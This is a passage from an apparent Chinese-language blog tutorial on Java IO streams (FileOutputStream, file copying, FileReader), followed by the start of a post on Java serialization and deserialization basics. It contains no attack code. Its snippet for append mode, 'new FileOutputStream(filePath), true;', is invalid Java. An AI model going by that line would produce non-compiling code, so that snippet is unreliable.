<span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">// 注意fileOutputStream的作用域，因为fileOutputStream需要在finally分支中被异常捕获</span><br>            <span class="hljs-comment">// 所以这里的 try 先不闭合</span><br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123 45&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//write(byte[] b) 将 b.length 个字节从指定 byte 数组写入此文件输出流中</span><br>                <span class="hljs-comment">//String类型的字符串可以使用getBytes()方法将字符串转换为byte数组</span><br>                fileOutputStream.write(content.getBytes());<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功写入</p><h4 id="write-byte-b-int-off-int-len-方法"><a href="#write-byte-b-int-off-int-len-方法" class="headerlink" title="write(byte[] b, int off, int len) 方法"></a>write(byte[] b, int off, int len) 方法</h4><ul><li><code>b</code>：要写入的字节数组</li><li><code>off</code>：从数组的哪个下标开始写</li><li><code>len</code>：要写入的字节个数</li></ul><p>关键点：<code>len</code> 不是“字符数量”，而是“字节数量”。</p><p>对于英文（单字节编码），<code>字符数 == 字节数</code>，所以感觉就是“长度等于字符数”。</p><p>但对于中文（UTF-8 编码下通常 3 个字节），一个字符 ≠ 一个字节。如果你误以为 <code>len=字符数</code> 就会出错（写不完整）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-comment">// write(byte[] b) 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123; <span class="hljs-comment">// 注意fileOutputStream的作用域，因为fileOutputStream需要在finally分支中被异常捕获</span><br>            <span class="hljs-comment">// 所以这里的 try 先不闭合</span><br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123 456&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//write(byte[] b) 将 b.length 个字节从指定 byte 数组写入此文件输出流中</span><br>                <span class="hljs-comment">//String类型的字符串可以使用getBytes()方法将字符串转换为byte数组</span><br>                fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8), <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利写入</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a25.png"></p><h4 id="追加写入"><a href="#追加写入" class="headerlink" title="追加写入"></a>追加写入</h4><p>如果想要写入的数据不被覆盖，可以设置 <code>FileOutputStream</code> 的构造方法 <code>append</code> 参数设置为 <code>true</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath);<br><span class="hljs-comment">// 设置追加写入</span><br>fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath), <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><h3 id="文件拷贝-–-input-outp-结合"><a href="#文件拷贝-–-input-outp-结合" class="headerlink" title="文件拷贝 – input outp 结合"></a>文件拷贝 – input outp 结合</h3><p>利用前文讲的 <code>fileInputStream</code> 和 <code>fileOutputStream</code> 进行文件拷贝。</p><p>原理上来说，先将文件的内容(注意，其实图片当中也是内容，这个内容不光是文字！) 读取出来，再写入新的文件当中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// 文件拷贝操作  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileCopy</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>            copyFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">srcFilename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">String</span> <span class="hljs-variable">desFilename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new2.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(srcFilename);  <br> fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(desFilename);  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">while</span>((readLen = fileInputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>                fileOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>    &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileInputStream.close();  <br> fileOutputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>        &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>拷贝成功，这里不再展示</p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><ul><li><code>FileReader</code> 将会一个一个<strong>字符</strong>读取，因此可以不乱码输出中文</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InputStreamReader</span><br>用来读取字符文件的便捷类。此类的构造方法假定默认字符编码和默认字节缓冲区大小都是适当的。要自己指定这些值，可以先在 FileInputStream 上构造一个 InputStreamReader。<br>FileReader 用于读取字符流。要读取原始字节流，请考虑使用 FileInputStream。<br></code></pre></td></tr></table></figure><p>下方测试代码将会将 <code>Serialable/src/IOStream/CreateForFile/new1.txt</code> 中的 new1.tx 文件打印输出至控制台：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileReader;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// 读取文件的字符流  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReaderPrint</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filePath);  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">char</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">8</span>];  <br> <span class="hljs-keyword">while</span> ((readLen = fileReader.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache, <span class="hljs-number">0</span>, readLen));  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileReader.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>顺利输出</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a26.png"></p><p>在之前利用字节流输出的中文都是乱码</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/05/30/Java-IO%E6%B5%81/">Java-IO流 | Drunkbaby’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-反序列化基础</title>
    <link href="/2025/08/18/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/08/18/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-反序列化基础"><a href="#Java安全-反序列化基础" class="headerlink" title="Java安全-反序列化基础"></a>Java安全-反序列化基础</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="1-什么是序列化与反序列化"><a href="#1-什么是序列化与反序列化" class="headerlink" title="1. 什么是序列化与反序列化"></a>1. 什么是序列化与反序列化</h3><p>序列化：对象 -&gt; 字符串<br>反序列化：字符串 -&gt; 对象</p><h3 id="2-为什么我们需要序列化与反序列化"><a href="#2-为什么我们需要序列化与反序列化" class="headerlink" title="2. 为什么我们需要序列化与反序列化"></a>2. 为什么我们需要序列化与反序列化</h3><p>序列化与反序列化的设计就是用来传输数据的。</p><p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p><h4 id="序列化的好处"><a href="#序列化的好处" class="headerlink" title="序列化的好处"></a>序列化的好处</h4><p>(1) 能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p><p>(2) 利用序列化实现远程通信，在网络上传送对象的字节序列。</p><h4 id="序列化与反序列化应用的场景"><a href="#序列化与反序列化应用的场景" class="headerlink" title="序列化与反序列化应用的场景"></a>序列化与反序列化应用的场景</h4><p>(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>(2) 用套接字在网络上传输对象。<br>(3) 通过 RMI 传输对象的时候。</p><h4 id="几种常见的序列化和反序列化协议"><a href="#几种常见的序列化和反序列化协议" class="headerlink" title="几种常见的序列化和反序列化协议"></a>几种常见的序列化和反序列化协议</h4><p>XML&amp;SOAP<br>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p><p>JSON（Javascript Object Notation）<br>Protobuf</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <span class="hljs-comment">// 修改成自己的 Package 路径</span><br>  <br><span class="hljs-keyword">import</span> java.io.Serializable;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> String name;  <br> <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;  <br>  <br>    &#125;  <br>    <span class="hljs-comment">// 构造函数  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br> <span class="hljs-built_in">this</span>.age = age;  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +  <br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +  <br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +  <br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutput;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> System.out.println(person);  <br>  serialize(person);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UnserializeTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> System.out.println(person);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="序列化与反序列化的代码讲解"><a href="#序列化与反序列化的代码讲解" class="headerlink" title="序列化与反序列化的代码讲解"></a>序列化与反序列化的代码讲解</h3><ul><li><strong>SerializationTest.java</strong></li></ul><p>这里我们将代码进行了封装，将序列化功能封装进了 <strong>serialize</strong> 这个方法里面，在序列化当中，我们通过这个 <code>FileOutputStream</code> 输出流对象，将序列化的对象输出到 <code>ser.bin</code> 当中。再调用 oos 的 <code>writeObject</code> 方法，将对象进行序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>oos.writeObject(obj);<br></code></pre></td></tr></table></figure><p>实际上，序列化数据是二进制，直接 <code>System.out.println()</code> 会是一堆不可读字符。<br>如果想要看得懂，需要转成 Base64 或 Hex 再打印。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos)) &#123;<br>            oos.writeObject(obj);<br>        &#125;<br>        <span class="hljs-comment">// 把序列化后的二进制转 Base64 方便打印</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64Data</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bos.toByteArray());<br>        System.out.println(<span class="hljs-string">&quot;序列化后的 Base64 数据：&quot;</span>);<br>        System.out.println(base64Data);<br><br>        <span class="hljs-comment">// 同时保存到文件</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)) &#123;<br>            fos.write(bos.toByteArray());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        System.out.println(<span class="hljs-string">&quot;原始对象：&quot;</span> + person);<br>        serialize(person);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><strong>UnserializeTest.java</strong></li></ul><p>进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br></code></pre></td></tr></table></figure><h3 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h3><p> 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p><p>Serializable 接口是 Java 提供的序列化接口，它是一个空接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Serializable</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。</p><p>通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 